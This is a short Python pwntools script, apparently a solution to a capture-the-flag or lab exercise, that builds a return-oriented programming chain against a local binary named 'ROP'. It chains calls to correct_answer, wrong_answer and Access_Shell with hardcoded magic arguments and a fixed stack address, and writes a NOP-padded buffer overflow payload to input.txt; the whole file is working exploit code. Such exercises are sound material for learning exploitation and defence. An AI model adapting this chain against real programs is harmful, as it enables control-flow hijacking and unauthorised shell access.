from pwn import *

exe = context.binary = ELF("./ROP")
r = ROP(exe)
r.call(exe.sym.correct_answer, [0xdabbadaa])
r.call(exe.sym.wrong_answer, [0xfacebaad, 0xfacefeed, 0xfacedead])
r.call(exe.sym.Access_Shell, [])
buffer_start = 0xffffd49c

chain = r.chain(buffer_start + 108 + 4)
print(chain)
amo = (108 + 4) * b"\x90" + chain
f = open("input.txt", "wb")
f.write(amo)
f.close()
